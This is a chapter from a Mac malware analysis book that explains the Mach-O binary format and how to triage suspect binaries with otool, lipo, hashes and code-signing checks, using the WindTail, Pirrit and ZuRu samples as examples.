<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 5: Binary Triage</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_99" title="99"/>5</span><br/>
<span class="ChapterTitle">Binary Triage</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">In the last chapter, I introduced static analysis tools and techniques and applied them to various nonbinary file formats, such as distribution mediums and scripts. In this chapter, we’ll continue our discussion of static analysis by focusing on Apple’s native executable file format, the venerable Mach object file format (Mach-O). As the majority of Mac malware is compiled into Mach-Os, all Mac malware analysts should understand the structure of these binaries, as at a minimum, this will allow you to differentiate the benign from the malicious.</p>
<h2 id="h1-501942c05-0001">The Mach-O File Format</h2>
<p class="BodyFirst">Like with all binary file formats, analyzing and understanding Mach-O files requires specific analysis tools, often culminating in the use of a binary disassembler. Executable binary file formats are rather complex, and the Mach-O is no exception. The good news is that you’ll need only an elementary understanding of the format, as well as a few related concepts, <span epub:type="pagebreak" id="Page_100" title="100"/>for malware analysis purposes. If you’re interested in gaining an even more exhaustive understanding of the format, see either Apple’s detailed developer documentation and SDK files or the write-up “Parsing Mach-O Files.”<sup class="endnote"><a href="#c05-endnote-1" id="c05-noteref-1">1</a></sup><sup> </sup></p>
<p>At a basic level, a Mach-O file consists of three sequential parts: a header, load commands, and data (<a href="#figure5-1" id="figureanchor5-1">Figure 5-1</a>).</p>
<figure>
<img alt="The Mach-O header sits at the top, with load commands in the middle and data at the bottom." class="" src="image_fi/501942c05/f05001.png"/>
<figcaption><p><a id="figure5-1">Figure 5-1</a>: Layout of a Mach-O binary</p></figcaption>
</figure>
<p>The header identifies the file as a Mach-O format and contains other metadata about the binary, while the load commands contain information used by the dynamic loader to load the binary into memory. These are followed by the binary’s actual instructions, variables, and other data. We’ll cover each of these parts in the following sections.</p>
<h3 id="h2-501942c05-0001">The Header</h3>
<p class="BodyFirst">Mach-O files start with a Mach-O <em>header</em>, which identifies the file as a Mach-O and specifies the target CPU architecture and type of Mach-O binary. The header also contains the number and size of the load commands.</p>
<p>A Mach-O header is a structure of type <code>mach_header_64</code>, or for 32-bit binaries, <code>mach_header</code>, defined in Apple’s developer SDK file, <em>mach-o/loader.h</em> (<a href="#listing5-1" id="listinganchor5-1">Listing 5-1</a>).</p>
<pre><code>struct mach_header_64 {<br/>        uint32_t        magic;          /* mach magic number identifier */<br/>        cpu_type_t      cputype;        /* cpu specifier */<br/>        cpu_subtype_t   cpusubtype;     /* machine specifier */<br/>        uint32_t        filetype;       /* type of file */<br/>        uint32_t        ncmds;          /* number of load commands */<br/>        uint32_t        sizeofcmds;     /* the size of all the load commands */<br/>        uint32_t        flags;          /* flags */<br/>        uint32_t        reserved;       /* reserved */<br/>};</code></pre>
<p class="CodeListingCaption"><a id="listing5-1">Listing 5-1</a>: The <code>mach_header_64</code> structure </p>
<p>Though Apple’s comments provide a succinct description of each member in the <code>mach_header_64</code> structure let’s take a closer at the ones relevant to malware analysis. First is the <code>magic</code> member, which contains a 32-bit value that identifies the file as a Mach-O binary. For 64-bit binaries, this will be set to the <code/><span epub:type="pagebreak" id="Page_101" title="101"/>MH_MAGIC_64 constant (defined in <em>loader.h</em>), containing the hex value <code>0xfeedfacf</code>. For older 32-bit binaries, Apple’s SDK files specify other values for this magic constant, but you’re unlikely to encounter these when analyzing modern Mac malware. </p>
<p>The <code>cputype</code> member of the structure specifies the CPU architecture that is compatible with Mach-O binary. You’ll likely encounter constants such as <code>I386</code>, <code>X86_64</code>, or <code>ARM64</code>. The <code>filetype</code> member describes the type of Mach-O binary. It can have several possible values, including <code>MH_EXECUTE</code> (0x2), which identifies a standard Mach-O executable; <code>MH_DYLIB</code> (0x6), which identifies a Mach-O dynamic linked library; and<em> </em><code>MH_BUNDLE</code> (0x8), which identifies a Mach-O bundle. As the vast majority of malicious Mach-O binaries are standalone executables, their type will be the former: <code>MH_EXECUTE</code>. Next in the <code>mach_header_64</code> structure are members that describe both the number and size of load command, which we’ll describe shortly. </p>
<p>The <code>otool</code> utility can be used to parse Mach-O binaries. For example, to dump the header of a Mach-O binary, execute it with the <code>-h</code> flag. You can also specify the <code>-v</code> flag to instruct <code>otool</code> to display constants rather than their raw numerical values (<a href="#listing5-2" id="listinganchor5-2">Listing 5-2</a>).</p>
<pre><code>% <b>otool -hv Final_Presentation.app/Contents/MacOS/usrnode</b> <br/><br/>Mach header<br/>   magic         cputype     cpusubtype      filetype     ncmds     sizeofcmds<br/>MH_MAGIC_64       X86_64         ALL          EXECUTE       23        3928</code></pre>
<p class="CodeListingCaption"><a id="listing5-2">Listing 5-2</a>: Viewing a Mach-O header with <code>otool</code> (WindTail)</p>
<p>As you can see, the WindTail malware is a standard Mach-O binary, compatible with 64-bit Intel CPUs. If you prefer a GUI interface, MachOView is a user-friendly utility capable of parsing Mach-O files, including WindTail (<a href="#figure5-2" id="figureanchor5-2">Figure 5-2</a>).<sup class="endnote"><a href="#c05-endnote-2" id="c05-noteref-2">2</a></sup></p>
<figure>
<img alt="MachOView lists the files within a Mach64 header, including magic number, CPU type and subtype, file type, number and size of load commands, and flags." class="" src="image_fi/501942c05/f05002.png"/>
<figcaption><p><a id="figure5-2">Figure 5-2</a>: Viewing a Mach-O header with MachOView (WindTail)</p></figcaption>
</figure>
<p>Note that a Mach-O binary contains code and data for one architecture only. To create a single binary that can execute on systems with different <span epub:type="pagebreak" id="Page_102" title="102"/>architectures (like Intel 64-bit and Apple Silicon arm64), developers can wrap multiple Mach-O binaries in a universal, or <em>fat</em>, binary. For example, Pirrit, the first malware known to natively run on Apple Silicon, is compiled as a universal binary. As shown in <a href="#listing5-3" id="listinganchor5-3">Listing 5-3</a>, it was distributed as an application (named GoSearch22), natively supporting both Intel and ARM CPUs.</p>
<pre><code>% <b>file GoSearch22.app/Contents/MacOS/GoSearch22</b><br/>GoSearch22: Mach-O universal binary with 2 architectures: <br/> [x86_64:Mach-O 64-bit executable x86_64] [arm64:Mach-O 64-bit executable arm64]<br/><br/>GoSearch22 (for architecture x86_64): Mach-O 64-bit executable x86_64<br/>GoSearch22 (for architecture arm64):  Mach-O 64-bit executable arm64</code></pre>
<p class="CodeListingCaption"><a id="listing5-3">Listing 5-3</a>: A universal binary (Pirrit)</p>
<p>Universal binaries start with a header (<code>fat_header</code>), a variable number of <code>fat_arch</code> structures that describe the supported architectures, and then the architecture-specific Mach-O binaries concatenated together. You can dump the <code>fat_header</code> by using the <code>otool</code> utility with the <code>-f</code> flag. In <a href="#listing5-4" id="listinganchor5-4">Listing 5-4</a> you can see that Pirrit’s fat header starts with the <code>FAT_MAGIC</code> constant (the hex value <code>0xcafebabe</code>). Following this are the two <code>fat_arch</code> structures for the architectures it natively supports, Intel x86_64 and ARM arm64. The <code>offset</code> member of the structure tells the loader where to find the architecture-specific Mach-O binary. </p>
<pre><code>% <b>otool -fv GoSearch22.app/Contents/MacOS/GoSearch22 </b><br/>Fat headers<br/>fat_magic FAT_MAGIC<br/>nfat_arch 2<br/>architecture x86_64<br/>    cputype CPU_TYPE_X86_64<br/>    cpusubtype CPU_SUBTYPE_X86_64_ALL<br/>    offset 4096<br/>    size 414368<br/>    ...<br/>architecture arm64<br/>    cputype CPU_TYPE_ARM64<br/>    cpusubtype CPU_SUBTYPE_ARM64_ALL<br/>    offset 425984<br/>    size 521632<br/>    ...</code></pre>
<p class="CodeListingCaption"><a id="listing5-4">Listing 5-4</a>: Viewing a fat header with <code>otool</code><code> -f</code> (Pirrit)</p>
<p>When a universal binary is run, the operating system automatically selects the architecture compatible with the host. For example, when Pirrit is run on a 64-bit Intel system, the x86_64 Mach-O version of the binary (which you’ll recall is embedded directly within the universal binary) is run. The embedded architecture-specific binaries should be functionally identical, so as a malware analyst, you may choose whichever architecture you’re more comfortable with analyzing, or whichever Mach-O binary will run on your analysis system. To extract an architecture-specific Mach-O binary from a universal binary, use macOS’s <code>lipo</code> tool. (Yes, clearly Apple <span epub:type="pagebreak" id="Page_103" title="103"/>engineers have some humor.) Run it with the <code>-thin</code> flag and the architecture you’d like to extract. For example, in <a href="#listing5-5" id="listinganchor5-5">Listing 5-5</a> we extract the Intel version of the Pirrit variant from its universal binary. And for good measure, we also confirm this architecture-specific extraction with the <code>file</code> utility. </p>
<pre><code>% <b>lipo GoSearch22.app/Contents/MacOS/GOSearch22 -thin x86_64 -output GoSearch22_INTEL</b><br/><br/>%<b> file GoSearch22_INTEL</b><br/>GoSearch22_INTEL:  Mach-O 64-bit executable x86_64</code></pre>
<p class="CodeListingCaption"><a id="listing5-5">Listing 5-5</a>: Extracting a Mach-O from a universal binary with <code>lipo</code> (Pirrit)</p>
<h3 id="h2-501942c05-0002">The Load Commands</h3>
<p class="BodyFirst">Directly following the Mach-O header are the binary’s <em>load commands</em>, which tell the dynamic loader (dyld) how to load and link the binary in memory. Among other information, the load commands can specify required dynamic libraries, the binary’s in-memory layout, and the initial execution state of the program’s main thread. You can view a Mach-O binary’s load commands with <code>otool</code> using the <code>-l</code> flag (<a href="#listing5-6" id="listinganchor5-6">Listing 5-6</a>). </p>
<pre><code>% <b>otool -lv Final_Presentation.app/Contents/MacOS/usrnode</b> <br/>...<br/>Load command 1<br/>      cmd LC_SEGMENT_64<br/>  cmdsize 952<br/>  segname __TEXT<br/>   vmaddr 0x0000000100000000<br/>   vmsize 0x0000000000013000<br/>  fileoff 0<br/> filesize 77824<br/>  maxprot rwx <br/> initprot r-x<br/>   nsects 11<br/>    flags (none)<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing5-6">Listing 5-6</a>: Viewing load commands with <code>otool</code> (WindTail)</p>
<p><a href="#listing5-6">Listing 5-6</a> shows a load command describing the <code>__TEXT</code> segment, which contains executable binary instructions. </p>
<p>Load commands all begin with a <code>load_command</code><b> </b>structure, defined in <em>mach-o/loader.h</em>. The <code>cmd</code> member describes the type of load command, while you’ll find the size of the load command in <code>cmdsize</code> (<a href="#listing5-7" id="listinganchor5-7">Listing 5-7</a>). </p>
<pre><code>struct load_command {<br/>        uint32_t cmd;           /* type of load command */<br/>        uint32_t cmdsize;       /* total size of command in bytes */<br/>};</code></pre>
<p class="CodeListingCaption"><a id="listing5-7">Listing 5-7</a>: The <code>load_command</code> structure (Pirrit)</p>
<p>Immediately after this <code>load_command</code> structure is the corresponding load command’s data, which is specific to the type of load command (<a href="#figure5-3" id="figureanchor5-3">Figure 5-3</a>). </p>
<span epub:type="pagebreak" id="Page_104" title="104"/><figure>
<img alt="The structure of a load command contains  on top, and load command data underneath." class="" src="image_fi/501942c05/f05003.png"/>
<figcaption><p><a id="figure5-3">Figure 5-3</a>: The layout of a load command</p></figcaption>
</figure>
<p>As we’re covering the Mach-O file format for the purpose of malware analysis, we won’t cover all supported load commands. However, several are quite pertinent, and we’ll review those here. </p>
<h4 id="h3-501942c05-0001">LC_SEGMENT_64</h4>
<p class="BodyFirst">One common type of load command is <code>LC_SEGMENT_64 </code><b>(</b>or <code>LC_SEGMENT</code> for 32-bit binaries), which describes a <em>segment</em>.<em> </em>For a given range of bytes in a Mach-O binary, a segment provides required information for the loader, such as the memory protections those bytes should have when mapped into virtual memory. <code>LC_SEGMENT_64</code> load commands contain all the relevant information for the dynamic loader to map the segment into memory and set its memory permissions. You’ll likely encounter, amongst others, the following three segments while analyzing Mach-O binaries: </p>
<ul>
<li><code>__TEXT</code>: Contains executable code and data that is read-only </li>
<li><code>__DATA</code>: Contains data that is writable </li>
<li><code>__LINKEDIT</code>: Contains information for the dynamic loader, for both linking and binding symbols</li>
</ul>
<p>If the binary was written in Objective-C, it may have an <code>__OBJC</code> segment that contains information used by the Objective-C runtime, though this information might also be found in the <code>__DATA</code> segment within various <code>__objc_*</code> sections. Segments can contain multiple sections, each containing code or data of the same type.</p>
<p>Once a binary is loaded into memory (by the dynamic loader), execution begins at the binary’s entry point. The entry point is found in the <code>LC_MAIN</code> load command, discussed next.</p>
<h4 id="h3-501942c05-0002">LC_MAIN</h4>
<p class="BodyFirst">The <code>LC_MAIN</code> load command is a structure of type <code>entry_point_command</code> (<a href="#listing5-8" id="listinganchor5-8">Listing 5-8</a>):</p>
<pre><code>struct entry_point_command {<br/>    uint32_t  cmd;      /* LC_MAIN only used in MH_EXECUTE filetypes */<br/>    uint32_t  cmdsize;  /* 24 */<br/>    uint64_t  entryoff; /* file (__TEXT) offset of main() */<br/><span epub:type="pagebreak" id="Page_105" title="105"/>    uint64_t  stacksize; /* if not zero, initial stack size */<br/>};</code></pre>
<p class="CodeListingCaption"><a id="listing5-8">Listing 5-8</a>: The <code>entry_point_command</code> structure </p>
<p>For the purposes of malware analysis, the most important member in the <code>entry_point_command</code> structure is <code>entryoff</code>, which contains the offset of the binary’s entry point. At load time, the dynamic loader simply adds this value to the in-memory base of the binary, and then jumps to this instruction to begin execution of the binary’s code.<sup class="endnote"><a href="#c05-endnote-3" id="c05-noteref-3">3</a></sup> Often, when performing a detailed analysis of a malicious binary, analysis will begin at this location. </p>
<p>The <code>LC_MAIN</code> load command replaces the deprecated <code>LC_UNIXTHREAD</code> load command, which you might still come across if you’re analyzing older Mach-O binaries. The <code>LC_UNIXTHREAD</code> load command contains the entire context, or register values, of the initial thread. In this context, the program counter register contains the address of the binary’s initial entry point. </p>
<p>Lastly, a Mach-O binary can contain one or more constructors that will be executed <em>before </em>the address specified in <code>LC_MAIN</code>. The offsets of any constructors are held in the <code>__mod_init_func</code> section of the <code>__DATA_CONST</code> segment. More on this topic shortly, but be aware when analyzing Mac malware that execution may begin within such a constructor, <em>prior to</em> the binary’s main entry point (<code>LC_MAIN</code>).</p>
<h4 id="h3-501942c05-0003">LC_LOAD_DYLIB</h4>
<p class="BodyFirst">The <code>LC_LOAD_DYLIB</code> load command describes a dynamic library dependency, and it instructs the dynamic loader to load and link a certain library. You’ll find an <code>LC_LOAD_DYLIB</code><b> </b>load command for each library the Mach-O binary requires. </p>
<p>This load command is a structure of type <code>dylib_command</code>, which itself contains a <code>dylib</code> structure that describes the dynamic library (<a href="#listing5-9" id="listinganchor5-9">Listing 5-9</a>).</p>
<pre><code>struct dylib_command {<br/>    uint32_t cmd;                       /* LC_LOAD_{,WEAK_}DYLIB */<br/>    uint32_t cmdsize;                   /* includes pathname string */<br/>    struct dylib dylib;                 /* the library identification */ <br/>};<br/><br/>struct dylib {<br/>    union lc_str name;                  /* library's path name */<br/>    uint32_t timestamp;                 /* library's build time stamp */<br/>    uint32_t current_version;           /* library's current version number */<br/>    uint32_t compatibility_version;     /* library's compatibility vers number */<br/>};</code></pre>
<p class="CodeListingCaption"><a id="listing5-9">Listing 5-9</a>: The <code>dylib_command</code> and <code>dylib</code> structures</p>
<p>You can parse a Mach-O binary’s <code>LC_LOAD_DYLIB</code> load command in order to view the binary’s dependencies. To do so, use the <code>otool</code> utility with the <code>-L</code> flag or MachOView. </p>
<p>From a malware analysis point of view, a binary’s <code>LC_LOAD_DYLIB</code> load commands can shed insight into the capabilities of the malware. For <span epub:type="pagebreak" id="Page_106" title="106"/>example, a binary that contains an <code>LC_LOAD_DYLIB</code> load command that references the <code>DiskArbitration</code> library may be interested in low-level access to disks, perhaps to monitor USB drives and exfiltrate files from them. A dependency on the <code>AVFoundation</code> library may indicate that the malware will capture audio and video from infected systems. </p>
<p>Note that you should closely examine a binary’s dependencies, too, as one of these dependent libraries could be malicious. For example, in late 2021, malware known as ZuRu was discovered, spreading via legitimate application binaries that had been surreptitiously trojanized by the addition of a new dependency. In the following <code>otool</code> output, the final dependency, <em>libcrypto.2.dylib</em> is actually the ZuRu malware (<a href="#listing5-10" id="listinganchor5-10">Listing 5-10</a>):</p>
<pre><code>%<b> otool -L iTerm.app/Contents/MacOS/iTerm2</b><br/>/usr/lib/libaprutil-1.0.dylib <br/>/usr/lib/libicucore.A.dylib <br/>/usr/lib/libc++.1.dylib <br/>...<br/>/usr/lib/libz.1.dylib <br/>@executable_path/../Frameworks/libcrypto.2.dylib </code></pre>
<p class="CodeListingCaption"><a id="listing5-10">Listing 5-10</a>: Dependencies of a trojanized iTerm application (ZuRu)</p>
<p>The malware author added this dynamic library to what is otherwise a legitimate version of the iTerm application. The now trojanized application had been re-signed, arousing suspicions; later, comparing it to a pristine version of iTerm revealed the additional, malicious dependency. If you’re interested in learning more about this attack, see my write-up “Made in China: OSX.ZuRu.”<sup class="endnote"><a href="#c05-endnote-4" id="c05-noteref-4">4</a></sup></p>
<h3 id="h2-501942c05-0003">The Data Segment</h3>
<p class="BodyFirst">Following the load commands is the rest of the Mach-O binary, which largely consists of the actual binary code. This data is organized into the segments described by the <code>LC_SEGMENT_64</code><b> </b>load commands. These segments can contain multiple sections, each of which contains code or data of the same type. For example, the aforementioned <code>__TEXT</code> segment contains executable code and data that is read-only. Common sections within this segment may include </p>
<ul>
<li><code>__text</code>: Compiled binary code</li>
<li><code>__const</code>: Constant data</li>
<li><code>__cstring</code>: String constants </li>
</ul>
<p>On the other hand, the <code>__DATA</code> segment contains data that is writeable. A few of the more common sections within this segment include</p>
<ul>
<li><code>__data</code>: Global variables (those that have been initialized)</li>
<li><code>__bss</code>: Static variables (those that have not been initialized)</li>
<li><code>__objc_*</code> (<code>__objc_classlist</code>, <code>__objc_protolis</code>): Information used by the Objective-C runtime </li>
</ul>
<p><span epub:type="pagebreak" id="Page_107" title="107"/>Now that you have an elementary understanding of the Mach-O file format, let’s focus our attention on tools and techniques that aim to answer the question forever faced by malware analysts: Is a given Mach-O binary malicious?</p>
<h2 id="h1-501942c05-0002">Classifying Mach-O Files</h2>
<p class="BodyFirst">Generally speaking, the first goal of malware analysis is to classify a sample as either benign, malicious but known, or malicious and previously unknown. If a sample turns out to be benign, then hooray: you’re done! In the context of malware analysis, there is generally no point to continue analyzing a legitimate and benign piece of software. If a sample is malicious but known, you’re likely done as well, unless you’re analyzing the sample for educational purposes, because other researchers who have studied the sample will often have published analysis reports. However, if you determine the sample is malicious and appears to either be a new variant or an entirely new specimen, the fun begins! Time for a deeper analysis.</p>
<p>The ability to classify samples efficiently is key to your success. I speak from experience when I say that spending several days analyzing a sample only to find out it is a well-known piece of malware can be frustrating. Due to their readability, it is often quite easy to classify scripts and other nonbinary file formats as either benign or malicious. On the other hand, classifying and analyzing binary files, such as Mach-Os, often requires the use of specific analysis tools. A fundamental understanding of the binary’s file format helps as well.</p>
<p>To effectively classify a Mach-O binary as malicious or benign, you can start by extracting and analyzing various file attributes, such as hashes, code-signing information, and embedded strings. If you can’t determine if a sample is benign or malicious by using these elementary tools and techniques, you may require more comprehensive tools, such as a disassembler, which we’ll cover in <span class="xref" itemid="xref_target_Chapter 6">Chapter 6</span>. </p>
<h3 id="h2-501942c05-0004">Hashes</h3>
<p class="BodyFirst">One of the simplest ways to determine if a Mach-O binary is known to be benign or malicious is to compute and look up its hash online. Public repositories of malware most commonly use the hashing algorithm MD5 or the SHA family of hashing algorithms. As macOS ships with built-in utilities for computing such hashes, it’s trivial to determine the hashes of any sample. In <a href="#listing5-11" id="listinganchor5-11">Listing 5-11</a>, we use these tools (<code>md5</code> and <code>shasum</code>), to generate both the MD5 and SHA-1 hash of a Mach-O binary called <em>usrnode</em> found within a suspicious application bundle:</p>
<pre><code>%<b> md5 Final_Presentation.app/Contents/MacOS/usrnode </b><br/>MD5 (usrnode) = c68a856ec8f4529147ce9fd3a77d7865<br/><br/>%<b> shasum -a 1 Final_Presentation.app/Contents/MacOS/usrnode</b><br/>758f10bd7c69bd2c0b38fd7d523a816db4addd90  usrnode</code></pre>
<p class="CodeListingCaption"><a id="listing5-11">Listing 5-11</a>: Computing hashes with <code>md5</code> and <code>shasum</code> (WindTail)</p>
<p><span epub:type="pagebreak" id="Page_108" title="108"/>If you’re more comfortable using a GUI utility, the WYS tool introduced in <span class="xref" itemid="xref_target_Chapter 4">Chapter 4</span> can compute MD5 and various SHA-* hashes of files. </p>
<p>Once you’ve determined the binary’s hash, look it up online. For example, searching for <em>usrnode</em>’s MD5 hash readily confirms the binary is indeed the WindTail malware (<a href="#figure5-4" id="figureanchor5-4">Figure 5-4</a>).</p>
<figure>
<img alt="Searching WindTail’s usrnode’s MD5 hash on Google returns “TAU Threat Intelligence Notification—WindTail (OSX…” as the first result." class="keyline" src="image_fi/501942c05/f05004.png"/>
<figcaption><p><a id="figure5-4">Figure 5-4</a>: Leveraging Google to identify a malicious file from its hash (WindTail)</p></figcaption>
</figure>
<p>Searching for this same hash on VirusTotal (<a class="LinkURL" href="https://www.virustotal.com/">https://www.virustotal.com/</a>), a free online antivirus scanning portal with a large collection of scan results, also confirms this identification (<a href="#figure5-5" id="figureanchor5-5">Figure 5-5</a>).</p>
<figure>
<img alt="Searching WindTail’s usrnode’s MD5 hash on VirusTotal returns a list of warnings under the Detection tab that identify this hash as malware from several different antivirus sites." class="keyline" src="image_fi/501942c05/f05005.png"/>
<figcaption><p><a id="figure5-5">Figure 5-5</a>: Leveraging VirusTotal to identify a malicious file from its hash (WindTail)</p></figcaption>
</figure>
<p>If the goal was to simply classify the binary as benign or malicious, we’ve just accomplished this via the binary’s hash. Moreover, by its hash alone, we were able to confirm the identity of the malware as WindTail. We should note that hashes are quite brittle, as any change to a file will result in a completely different hash. As such, if a malware author modifies even a single bit in the binary, you may find no online hash matches. Thus, if you don’t find a hash match, don’t use this fact to classify the file as non-malicious! Instead, turn to other analysis tools and techniques. </p>
<p>I’ve noted that hashes can also be helpful in classifying a binary as benign. The idea is roughly the same: compute the hash and search for it online (or in various “goodware” collections as such as NIST’s National Software Reference Library<sup class="endnote"><a href="#c05-endnote-5" id="c05-noteref-5">5</a></sup>). If it’s found and identified by a trusted source as a benign binary, more than likely it is. However, there’s a better <span epub:type="pagebreak" id="Page_109" title="109"/>way to ascertain if a binary should be trusted: examining its code-signing information. </p>
<h3 id="h2-501942c05-0005">Code-Signing Information</h3>
<p class="BodyFirst">Due to macOS security mechanisms such as Gatekeeper and notarization requirements, most software on macOS is now signed. This allows users (and malware analysts) to confirm that the software has come from a known source and has not been modified. In the context of malware analysis, relevant <em>code-signing information</em> includes the status of the signing certificate, code-signing authorities, and the team identifier. A signing certificate in poor standing (for example, one that has been revoked) is a likely indicator of misuse. <em>Code-signing authorities </em>describe the chain of signers, which can provide insight into the origin and trustworthiness of the signed item. Finally, the optional <em>team identifier </em>specifies the team or company that created the signed item. In the case where the team identifier specifies a known and reputable company, this expresses trustworthiness of a signed item. On the other hand, if a signed item proves to be malicious, a team identifier can be used to tie it to, or even uncover, unrelated malware created by the same attackers.</p>
<p>By extracting the code-signing information of signed Mach-O binaries, you may be able to quickly verify that an unknown binary is benign. For example, if a binary is signed by Apple proper (“Apple Code Signing Certification Authority”), you can rest assured that the binary is not malicious. On the other hand, if a binary is unsigned or claims to be from a well-established company but isn’t signed by that company, you have cause for further analysis. As an example of the latter, the CreativeUpdate malware that propagated via a trojanized Firefox application was signed not by Mozilla but instead with a personal Apple developer identifier fraudulently obtained by the malware authors. </p>
<p>Like with hashes, you can research code-signing information online and in some cases match unknown files to known malware. For example, searching for the aforementioned <em>usrnode</em> binary’s code-signing team identifier quickly brings up results associated with the WindShift malware family that includes WindTail (<a href="#figure5-6" id="figureanchor5-6">Figure 5-6</a>).</p>
<figure>
<img alt="Searching WindTail’s usrnode binary’s certificate on Google returns links to two different sites (one of which is unit42.paloaltonetworks.com, and the other is my blog, objective-see.com) identifying this as associated with malware." class="keyline" src="image_fi/501942c05/f05006.png"/>
<figcaption><p><a id="figure5-6">Figure 5-6</a>: Leveraging Google to identify a malicious file via its code-signing team identifier (WindTail)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_110" title="110"/>Finally, if a Mach-O binary is signed but Apple has revoked its certificate, you should treat this as a rather massive red flag, and it almost certainly indicates that the binary is malicious. </p>
<p>You can extract code-signing information from a Mach-O binary with Apple’s <code>codesign</code> utility using the <code>-dvv</code> flags (<a href="#listing5-12" id="listinganchor5-12">Listing 5-12</a>).</p>
<pre><code>%<b> codesign -dvv Final_Presentation.app/Contents/MacOS/usrnode</b><br/>Executable=Final_Presentation.app/Contents/MacOS/usrnode<br/>Identifier=com.alis.tre<br/>Format=app bundle with Mach-O thin (x86_64)<br/><br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> Authority=(unavailable)<br/>   TeamIdentifier=95RKE2AA8F<br/>   ...</code></pre>
<p class="CodeListingCaption"><a id="listing5-12">Listing 5-12</a>: Viewing code-signing information for a self-signed file with <code>codesign</code> (WindTail)</p>
<p>As you can see, this WindTail sample is signed but has no signing authorities <span aria-label="annotation1" class="CodeAnnotation">1</span>. This indicates that the sample is self-signed, and self-signed binaries are rarely legitimate. By contrast, take a look at the following legitimate Mach-O binary for Apple’s built-in Calculator application. The <code>codesign</code> output shows the full signing authority chain (<a href="#listing5-13" id="listinganchor5-13">Listing 5-13</a>).</p>
<pre><code>% <b>codesign -dvv Calculator.app </b><br/>Executable=Calculator.app/Contents/MacOS/Calculator<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> Identifier=com.apple.calculator <br/>Format=app bundle with Mach-O universal (x86_64 arm64e)<br/><span aria-label="annotation2" class="CodeAnnotationHang">2</span> Authority=Software Signing <br/>Authority=Apple Code Signing Certification Authority<br/>Authority=Apple Root CA<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing5-13">Listing 5-13</a>: Viewing code-signing information for an Apple application with <code>codesign</code></p>
<p>Legitimate Apple platform binaries will contain an identifier that is prefixed with <code>com.apple</code> <span aria-label="annotation1" class="CodeAnnotation">1</span> and be signed with a code-signing authority chain, as shown in <a href="#listing5-13">Listing 5-13</a> <span aria-label="annotation2" class="CodeAnnotation">2</span>. </p>
<p>Signed third-party applications should have a binary signed with an Apple Developer ID. In <a href="#listing5-14" id="listinganchor5-14">Listing 5-14</a>, note the Developer ID for the Microsoft Word application, which confirms it indeed was created and signed by Microsoft.</p>
<pre><code>% <b>codesign -dvv Microsoft/Applications/Microsoft Word.app</b><b> </b><br/>Executable=Microsoft Word.app/Contents/MacOS/Microsoft Word<br/>Identifier=com.microsoft.Word<br/>...<br/>Authority=Developer ID Application: Microsoft Corporation (UBF8T346G9)<br/>Authority=Developer ID Certification Authority<br/>Authority=Apple Root CA<br/><br/>TeamIdentifier=UBF8T346G9<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing5-14">Listing 5-14</a>: Viewing code-signing information for a third-party application with <code>codesign</code></p>
<p><span epub:type="pagebreak" id="Page_111" title="111"/>However, as the majority of Mac malware is signed with an Apple developer identifier, don’t assume a binary is benign if it is signed in this manner. Instead, examine the code-signing authority, and if provided, the team identifier. In <a href="#listing5-14">Listing 5-14</a>, the application is validly signed with an Apple developer identifier and contains a team identifier, both of which belong to Microsoft, so you can be confident that the application was created by Microsoft, and thus is not malicious. </p>
<p>As discussed in <span class="xref" itemid="xref_target_Chapter 1">Chapter 1</span>, Apple recently introduced notarization requirements on software distributed by third-party developers via the internet. As Apple will only notarize items that it has scanned and decided are not malicious, checking if an item is notarized (or not!) can help you decide if an item is benign or malicious. Moreover, the vast majority of legitimate third-party software should be notarized, whereas malware (in theory) will not be. </p>
<p>To check if an item is notarized, use the <code>codesign</code> utility with the<code> --test-requirement="=notarized"</code> and <code>--verify</code> command line arguments, or the <code>spctl</code> utility.<sup class="endnote"><a href="#c05-endnote-6" id="c05-noteref-6">6</a></sup> In <a href="#listing5-15" id="listinganchor5-15">Listing 5-15</a>, we use the latter to confirm that the Microsoft Word application is indeed notarized. </p>
<pre><code>%<b> spctl -a -v /Applications/Microsoft Word.app </b><br/>/Applications/Microsoft Word.app: accepted<br/>source=Notarized Developer ID</code></pre>
<p class="CodeListingCaption"><a id="listing5-15">Listing 5-15</a>: Viewing the notarization status of a file via <code>spctl</code></p>
<p>A word of caution: in rare cases, Apple has inadvertently notarized malicious code!<sup class="endnote"><a href="#c05-endnote-7" id="c05-noteref-7">7</a></sup> Don’t solely rely on the notarization status of an item when classifying it as either malicious or benign. </p>
<p>Finally, <code>codesign</code> will simply display <code>code object is not signed at all</code> for unsigned Mach-O binaries. As most legitimate software is now signed and notarized, unsigned code should be treated as somewhat suspect until a comprehensive analysis has confirmed otherwise. </p>
<p>I mentioned earlier that if Apple has revoked the code-signing certificate used to sign a Mach-O, this likely means that Apple deemed the binary to be malicious. Using the <code>codesign</code> utility with the <code>-v</code> command line flag, you can check the status of a binary’s code-signing certificate. If a certificate has been revoked, the utility will display <code>CSSMERR_TP_CERT_REVOKED</code>. As an example, let’s examine the code-signing information for the WindTail binary, noting that the code-signing certificate has now been revoked (<a href="#listing5-16" id="listinganchor5-16">Listing 5-16</a>):</p>
<pre><code>% <b>codesign -v Final_Presentation.app/Contents/MacOS/usrnode </b><br/>Final_Presentation.app/Contents/MacOS/usrnode: CSSMERR_TP_CERT_REVOKED</code></pre>
<p class="CodeListingCaption"><a id="listing5-16">Listing 5-16</a>: Viewing the certificate status of a file with <code>codesign</code> (WindTail)</p>
<p>You can also use the WYS tool to extract code-signing information. Code-signing is an important but involved topic. To learn more, see “Code Signing—Hashed Out” and “macOS Code Signing In Depth.”<sup class="endnote"><a href="#c05-endnote-8" id="c05-noteref-8">8</a></sup></p>
<h3 id="h2-501942c05-0006"><span epub:type="pagebreak" id="Page_112" title="112"/>Strings</h3>
